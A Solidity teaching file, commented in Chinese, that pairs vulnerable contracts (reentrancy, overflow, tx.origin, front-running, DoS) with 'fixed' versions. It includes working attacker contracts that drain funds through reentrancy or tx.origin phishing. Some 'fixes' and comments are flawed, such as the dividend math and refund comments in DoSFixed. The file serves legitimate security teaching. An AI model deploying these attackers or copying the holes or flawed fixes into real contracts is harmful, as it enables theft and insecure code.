// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CommonVulnerabilities
 * @dev 智能合约常见漏洞完整演示
 * @notice 演示重入、整数溢出、访问控制、前置交易等常见攻击
 */

// ==================== 重入攻击 ====================

/**
 * @title ReentrancyVulnerable
 * @dev 易受重入攻击的合约
 * @notice ❌ 不要在生产环境使用
 */
contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;

    event Deposit(address indexed account, uint256 amount);
    event Withdrawal(address indexed account, uint256 amount);

    /**
     * @dev 存款
     */
    function deposit() public payable {
        require(msg.value > 0, "Deposit amount must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev ❌ 易受重入攻击的取款函数
     * @notice 违反了 Checks-Effects-Interactions 模式
     */
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // ❌ 先进行外部调用 - 重入攻击点
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // ❌ 后更新状态 - 已经太晚了!
        balances[msg.sender] -= _amount;

        emit Withdrawal(msg.sender, _amount);
    }

    /**
     * @dev 获取合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttacker
 * @dev 重入攻击合约
 * @notice 演示如何利用重入漏洞
 */
contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint256 public attackCount;
    uint256 public stolenAmount;

    event AttackStarted(uint256 amount);
    event ReentrancySuccess(uint256 amount);
    event AttackCompleted(uint256 totalStolen);

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }

    /**
     * @dev 发起攻击
     */
    function attack() public payable {
        require(msg.value > 0, "Need some ETH to start");
        
        emit AttackStarted(msg.value);
        
        // 先存款
        target.deposit{value: msg.value}();
        
        // 然后取款 - 会触发 fallback
        target.withdraw(msg.value);
    }

    /**
     * @dev 回退函数 - 重入攻击的核心
     * @notice 在目标合约更新状态前再次调用取款
     */
    fallback() external payable {
        attackCount++;

        if (attackCount <= 3) {  // 限制重入次数防止 Gas 耗尽
            emit ReentrancySuccess(msg.value);

            // 再次调用取款 - 此时余额尚未扣除
            target.withdraw(msg.value);
        }

        stolenAmount += msg.value;
    }

    receive() external payable {
        // 同样的逻辑用于接收 ETH
        attackCount++;

        if (attackCount <= 3) {
            target.withdraw(msg.value);
        }

        stolenAmount += msg.value;
    }

    /**
     * @dev 获取攻击收益
     */
    function getStolenFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @dev 获取攻击统计
     */
    function getAttackStats() public view returns (
        uint256 _attackCount,
        uint256 _stolenAmount,
        uint256 _balance
    ) {
        return (attackCount, stolenAmount, address(this).balance);
    }
}

/**
 * @title ReentrancyFixed
 * @dev 修复了重入漏洞的合约
 * @notice ✅ 安全的实现
 */
contract ReentrancyFixed {
    mapping(address => uint256) public balances;

    event Deposit(address indexed account, uint256 amount);
    event Withdrawal(address indexed account, uint256 amount);

    /**
     * @dev 安全的取款函数 - 使用 CEI 模式
     */
    function withdraw(uint256 _amount) public {
        // 1. Checks - 检查条件
        require(_amount > 0, "Amount must be greater than 0");
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 2. Effects - 更新状态
        balances[msg.sender] -= _amount;

        // 3. Interactions - 外部调用
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, _amount);
    }

    function deposit() public payable {
        require(msg.value > 0);
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
}

// ==================== 整数溢出/下溢 ====================

/**
 * @title IntegerOverflowVulnerable
 * @dev 整数溢出漏洞示例
 * @notice 在 Solidity 0.8.x 之前很常见
 */
contract IntegerOverflowVulnerable {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev ❌ 易受溢出攻击的转账函数
     * @notice 在 Solidity 0.8.0 之前会溢出
     */
    function unsafeTransfer(address _to, uint256 _amount) public {
        // 如果余额 + amount 溢出，结果会很小
        // require 会通过，但实际余额不足
        require(balances[msg.sender] + _amount >= balances[msg.sender], "Overflow check");
        
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        
        emit Transfer(msg.sender, _to, _amount);
    }

    /**
     * @dev ❌ 易受下溢攻击的转账函数
     */
    function unsafeWithdraw(uint256 _amount) public {
        // 如果 amount > balance，会下溢到巨大值
        require(balances[msg.sender] - _amount >= 0, "Underflow check");
        
        balances[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }
}

/**
 * @title IntegerOverflowFixed
 * @dev 修复了整数溢出漏洞的合约
 * @notice ✅ 使用 Solidity 0.8.x 或 SafeMath
 */
contract IntegerOverflowFixed {
    mapping(address => uint256) public balances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 amount);

    /**
     * @dev 铸造代币 - 仅用于测试
     */
    function mint(address _to, uint256 _amount) public {
        balances[_to] += _amount;
        emit Mint(_to, _amount);
    }

    /**
     * @dev ✅ 安全的转账函数
     * @notice Solidity 0.8.x 会自动检查溢出
     */
    function safeTransfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        require(_to != address(0), "Invalid recipient");

        balances[msg.sender] -= _amount;
        balances[_to] += _amount;

        emit Transfer(msg.sender, _to, _amount);
    }

    /**
     * @dev 使用 unchecked 块手动检查边界
     * @notice 只在确定不会溢出时使用
     */
    function safeIncrement(uint256 _value) public pure returns (uint256) {
        uint256 result;
        unchecked {
            // 手动确保不会溢出
            require(_value < type(uint256).max, "Would overflow");
            result = _value + 1;
        }
        return result;
    }
}

// ==================== 访问控制漏洞 ====================

/**
 * @title AccessControlVulnerable
 * @dev 访问控制漏洞示例
 * @notice ❌ 不要在生产环境使用
 */
contract AccessControlVulnerable {
    address public owner;
    mapping(address => uint256) public balances;
    bool public locked;

    event Withdrawal(address indexed account, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev ❌ 易受攻击的提款函数
     * @notice 没有访问控制，任何人都能调用
     */
    function withdrawAll() public {
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev ❌ 错误的权限检查
     * @notice 只检查 tx.origin，容易被钓鱼攻击
     */
    function withdrawTo(address _to) public {
        require(tx.origin == owner, "Not authorized");
        payable(_to).transfer(address(this).balance);
    }

    /**
     * @dev ❌ 遗漏的访问控制
     * @notice 管理函数忘记添加 onlyOwner
     */
    function mintTokens(address _to, uint256 _amount) public {
        balances[_to] += _amount;
    }

    /**
     * @dev ❌ 不完整的访问控制
     * @notice 只检查部分函数
     */
    function emergencyWithdraw() public {
        require(locked, "Not locked");
        payable(msg.sender).transfer(address(this).balance);
    }
}

/**
 * @title AccessControlFixed
 * @dev 修复了访问控制漏洞的合约
 * @notice ✅ 完整的访问控制
 */
contract AccessControlFixed {
    address public owner;
    address public admin;
    mapping(address => uint256) public balances;
    bool public locked;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Not admin");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Withdrawal(address indexed account, uint256 amount);

    constructor() {
        owner = msg.sender;
        admin = msg.sender;
    }

    /**
     * @dev ✅ 正确的访问控制
     */
    function withdrawAll() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev ✅ 使用 msg.sender 而非 tx.origin
     */
    function withdrawTo(address _to) public onlyOwner {
        require(_to != address(0), "Invalid address");
        payable(_to).transfer(address(this).balance);
    }

    /**
     * @dev ✅ 添加了访问控制
     */
    function mintTokens(address _to, uint256 _amount) public onlyAdmin {
        require(_to != address(0), "Invalid address");
        balances[_to] += _amount;
    }

    /**
     * @dev ✅ 完整的访问控制
     */
    function emergencyWithdraw() public onlyOwner {
        require(locked, "Not locked");
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev 转移所有权
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

/**
 * @title TxOriginAttacker
 * @dev 钓鱼攻击合约
 * @notice 演示 tx.origin 的危险性
 */
contract TxOriginAttacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev 伪装成合法合约
     * @notice 诱导受害者调用
     */
    function attack(address _target) external {
        // 调用目标合约的 withdrawTo 函数
        // 由于 tx.origin 是受害者，攻击会成功
        AccessControlVulnerable(_target).withdrawTo(owner);
    }
}

// ==================== 前置交易攻击 ====================

/**
 * @title FrontRunningVulnerable
 * @dev 易受前置交易攻击的合约
 * @notice ❌ 不要在生产环境使用
 */
contract FrontRunningVulnerable {
    struct Bid {
        address bidder;
        uint256 amount;
        uint256 timestamp;
    }

    Bid public highestBid;
    bool public auctionEnded;

    event NewBid(address indexed bidder, uint256 amount);
    event AuctionEnded(address indexed winner, uint256 amount);

    /**
     * @dev ❌ 易受前置交易攻击的出价函数
     * @notice 攻击者可以监控交易池并抢先出价
     */
    function placeBid() public payable {
        require(!auctionEnded, "Auction ended");
        require(msg.value > highestBid.amount, "Bid not high enough");

        // 退还之前的出价
        if (highestBid.bidder != address(0)) {
            payable(highestBid.bidder).transfer(highestBid.amount);
        }

        highestBid = Bid({
            bidder: msg.sender,
            amount: msg.value,
            timestamp: block.timestamp
        });

        emit NewBid(msg.sender, msg.value);
    }

    /**
     * @dev 结束拍卖
     */
    function endAuction() public {
        require(!auctionEnded, "Auction already ended");
        require(block.timestamp >= highestBid.timestamp + 1 days, "Too early");
        
        auctionEnded = true;
        emit AuctionEnded(highestBid.bidder, highestBid.amount);
    }
}

/**
 * @title FrontRunningFixed
 * @dev 修复了前置交易攻击的合约
 * @notice ✅ 使用提交-揭示模式
 */
contract FrontRunningFixed {
    struct Bid {
        address bidder;
        bytes32 blindedBid;
        uint256 deposit;
    }

    struct RevealedBid {
        address bidder;
        uint256 amount;
        uint256 timestamp;
    }

    enum Phase { Open, Reveal, Ended }
    
    Phase public phase;
    RevealedBid public highestBid;
    mapping(bytes32 => Bid) public bids;
    
    uint256 public revealEnd;
    uint256 public auctionEnd;

    event BidPlaced(address indexed bidder, bytes32 blindedBid);
    event BidRevealed(address indexed bidder, uint256 amount);
    event AuctionEnded(address indexed winner, uint256 amount);

    constructor() {
        phase = Phase.Open;
        revealEnd = block.timestamp + 1 days;
        auctionEnd = block.timestamp + 2 days;
    }

    /**
     * @dev ✅ 提交盲做出价
     * @notice 使用哈希隐藏真实出价
     */
    function placeBid(bytes32 _blindedBid) public payable {
        require(phase == Phase.Open, "Not in bidding phase");
        require(msg.value >= 0.1 ether, "Deposit too low");

        bids[_blindedBid] = Bid({
            bidder: msg.sender,
            blindedBid: _blindedBid,
            deposit: msg.value
        });

        emit BidPlaced(msg.sender, _blindedBid);
    }

    /**
     * @dev ✅ 揭示出价
     * @notice 所有人同时揭示，防止前置交易
     */
    function revealBid(uint256 _amount, bytes32 _secret) public {
        require(phase == Phase.Reveal, "Not in reveal phase");
        
        bytes32 blindedBid = keccak256(abi.encodePacked(msg.sender, _amount, _secret));
        Bid storage bid = bids[blindedBid];
        
        require(bid.bidder == msg.sender, "Invalid bid reveal");
        require(bid.deposit >= _amount, "Deposit insufficient");

        // 返还多余存款
        if (bid.deposit > _amount) {
            payable(msg.sender).transfer(bid.deposit - _amount);
        }

        // 更新最高出价
        if (_amount > highestBid.amount) {
            // 退还之前的最高出价
            if (highestBid.bidder != address(0)) {
                payable(highestBid.bidder).transfer(highestBid.amount);
            }

            highestBid = RevealedBid({
                bidder: msg.sender,
                amount: _amount,
                timestamp: block.timestamp
            });
        }

        emit BidRevealed(msg.sender, _amount);
    }

    /**
     * @dev 进入揭示阶段
     */
    function startRevealPhase() public {
        require(block.timestamp >= revealEnd, "Too early");
        phase = Phase.Reveal;
    }

    /**
     * @dev 结束拍卖
     */
    function endAuction() public {
        require(phase == Phase.Reveal, "Not in reveal phase");
        require(block.timestamp >= auctionEnd, "Too early");
        
        phase = Phase.Ended;
        emit AuctionEnded(highestBid.bidder, highestBid.amount);
    }
}

// ==================== 拒绝服务攻击 ====================

/**
 * @title DoSVulnerable
 * @dev 易受拒绝服务攻击的合约
 * @notice ❌ 不要在生产环境使用
 */
contract DoSVulnerable {
    address[] public investors;
    mapping(address => uint256) public balances;
    uint256 public investorCount;
    bool public paused;

    event Investment(address indexed investor, uint256 amount);
    event Payout(address indexed investor, uint256 amount);

    /**
     * @dev 投资
     */
    function invest() public payable {
        require(msg.value > 0, "Investment too low");
        
        if (balances[msg.sender] == 0) {
            investors.push(msg.sender);
            investorCount++;
        }
        
        balances[msg.sender] += msg.value;
        emit Investment(msg.sender, msg.value);
    }

    /**
     * @dev ❌ 易受 DoS 攻击的分红函数
     * @notice 如果某个投资者是合约，转账失败会导致整个函数回滚
     */
    function distributeDividends() public payable {
        require(msg.value > 0, "No dividend to distribute");
        
        for (uint256 i = 0; i < investors.length; i++) {
            address investor = investors[i];
            uint256 dividend = (msg.value * balances[investor]) / address(this).balance;
            
            if (dividend > 0) {
                // ❌ 如果转账失败，整个函数会回滚
                payable(investor).transfer(dividend);
                emit Payout(investor, dividend);
            }
        }
    }

    /**
     * @dev ❌ 无限循环风险
     * @notice 攻击者可以创建大量账户导致 Gas 耗尽
     */
    function refundAll() public {
        for (uint256 i = 0; i < investors.length; i++) {
            address investor = investors[i];
            uint256 amount = balances[investor];
            
            if (amount > 0) {
                balances[investor] = 0;
                payable(investor).transfer(amount);
            }
        }
    }
}

/**
 * @title DoSFixed
 * @dev 修复了拒绝服务漏洞的合约
 * @notice ✅ 使用拉取支付模式和数组优化
 */
contract DoSFixed {
    address[] public investors;
    mapping(address => uint256) public balances;
    uint256 public investorCount;
    uint256 public totalDividends;
    mapping(address => uint256) public withdrawnDividends;

    event Investment(address indexed investor, uint256 amount);
    event DividendDeposited(uint256 amount);
    event DividendWithdrawn(address indexed investor, uint256 amount);

    /**
     * @dev 投资
     */
    function invest() public payable {
        require(msg.value > 0.01 ether, "Investment too low");
        
        if (balances[msg.sender] == 0) {
            investors.push(msg.sender);
            investorCount++;
        }
        
        balances[msg.sender] += msg.value;
        emit Investment(msg.sender, msg.value);
    }

    /**
     * @dev ✅ 存入分红
     * @notice 不立即分发，避免 Gas 耗尽
     */
    function depositDividends() public payable {
        require(msg.value > 0, "No dividend to deposit");
        totalDividends += msg.value;
        emit DividendDeposited(msg.value);
    }

    /**
     * @dev ✅ 拉取支付模式
     * @notice 投资者主动提取分红
     */
    function withdrawDividend() public {
        uint256 dividend = calculateDividend(msg.sender);
        require(dividend > 0, "No dividend to withdraw");

        withdrawnDividends[msg.sender] += dividend;
        payable(msg.sender).transfer(dividend);
        
        emit DividendWithdrawn(msg.sender, dividend);
    }

    /**
     * @dev 计算应得分红
     */
    function calculateDividend(address _investor) public view returns (uint256) {
        if (balances[_investor] == 0) return 0;
        
        uint256 totalBalance = address(this).balance + totalDividends;
        uint256 proportion = (balances[_investor] * 1e18) / totalBalance;
        uint256 dividend = (totalDividends * proportion) / 1e18;
        
        return dividend - withdrawnDividends[_investor];
    }

    /**
     * @dev ✅ 优化的退款函数
     * @notice 使用删除元素而非标记
     */
    function batchRefund(uint256 _start, uint256 _end) public {
        require(_end <= investors.length, "Invalid range");
        require(_start < _end, "Invalid range");
        
        for (uint256 i = _start; i < _end; i++) {
            address investor = investors[i];
            uint256 amount = balances[investor];
            
            if (amount > 0) {
                balances[investor] = 0;
                payable(investor).transfer(amount);
            }
        }
    }
}

// ==================== 综合攻击演示 ====================

/**
 * @title VulnerableVault
 * @dev 综合漏洞演示合约
 * @notice ❌ 包含多个漏洞的合约，仅用于教学
 */
contract VulnerableVault {
    mapping(address => uint256) public deposits;
    address public owner;
    uint256 public totalDeposits;
    bool public locked;

    event Deposit(address indexed account, uint256 amount);
    event Withdrawal(address indexed account, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev 存款
     */
    function deposit() public payable {
        require(msg.value > 0, "Deposit too low");
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev ❌ 多重漏洞的取款函数
     * @notice 包含重入、访问控制等漏洞
     */
    function withdraw(uint256 _amount) public {
        require(deposits[msg.sender] >= _amount, "Insufficient balance");
        
        // ❌ 重入漏洞 - 先转账后更新
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        deposits[msg.sender] -= _amount;
        totalDeposits -= _amount;
        
        emit Withdrawal(msg.sender, _amount);
    }

    /**
     * @dev ❌ 访问控制漏洞
     * @notice 使用 tx.origin
     */
    function emergencyWithdraw() public {
        require(tx.origin == owner, "Not authorized");
        require(locked, "Not locked");
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev ❌ 整数溢出风险
     * @notice 在 0.8.0 之前版本会溢出
     */
    function unsafeAdd(address _user, uint256 _amount) public {
        deposits[_user] += _amount;  // 可能溢出
        totalDeposits += _amount;
    }

    /**
     * @dev 锁定金库
     */
    function lock() public {
        require(msg.sender == owner, "Not owner");
        locked = true;
    }

    /**
     * @dev 解锁金库
     */
    function unlock() public {
        require(msg.sender == owner, "Not owner");
        locked = false;
    }
}

/**
 * @title ComprehensiveAttacker
 * @dev 综合攻击合约
 * @notice 演示多种攻击方式
 */
contract ComprehensiveAttacker {
    VulnerableVault public target;
    uint256 public attackSuccessCount;
    uint256 public attackAmount;

    event AttackSuccess(string attackType, uint256 amount);
    event AttackFailed(string attackType, string reason);

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    /**
     * @dev 重入攻击
     */
    function reentrancyAttack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;

        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    fallback() external payable {
        attackSuccessCount++;

        if (attackSuccessCount <= 3) {
            target.withdraw(attackAmount);
        }
    }

    /**
     * @dev 获取攻击收益
     */
    function withdrawStolenFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @dev 获取攻击统计
     */
    function getStats() public view returns (
        uint256 _attackSuccessCount,
        uint256 _balance
    ) {
        return (attackSuccessCount, address(this).balance);
    }

    receive() external payable {}
}

/**
 * @title SecureVault
 * @dev 修复了所有漏洞的安全金库
 * @notice ✅ 生产级别的实现
 */
contract SecureVault {
    mapping(address => uint256) public deposits;
    address public owner;
    uint256 public totalDeposits;
    bool public paused;
    bool private locked;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Paused");
        _;
    }

    modifier noReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    event Deposit(address indexed account, uint256 amount);
    event Withdrawal(address indexed account, uint256 amount);
    event Paused(address account);
    event Unpaused(address account);

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev ✅ 安全的存款
     */
    function deposit() public payable whenNotPaused noReentrant {
        require(msg.value > 0, "Deposit too low");
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev ✅ 安全的取款 - CEI 模式 + 防重入
     */
    function withdraw(uint256 _amount) public whenNotPaused noReentrant {
        require(_amount > 0, "Invalid amount");
        require(deposits[msg.sender] >= _amount, "Insufficient balance");

        // CEI 模式
        deposits[msg.sender] -= _amount;
        totalDeposits -= _amount;

        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, _amount);
    }

    /**
     * @dev 暂停合约
     */
    function pause() public onlyOwner {
        paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @dev 恢复合约
     */
    function unpause() public onlyOwner {
        paused = false;
        emit Unpaused(msg.sender);
    }

    /**
     * @dev 紧急取款
     */
    function emergencyWithdraw(address _user, uint256 _amount) public onlyOwner {
        require(paused, "Not paused");
        require(deposits[_user] >= _amount, "Insufficient balance");
        
        deposits[_user] -= _amount;
        totalDeposits -= _amount;
        
        payable(_user).transfer(_amount);
        emit Withdrawal(_user, _amount);
    }

    receive() external payable {
        deposit();
    }
}
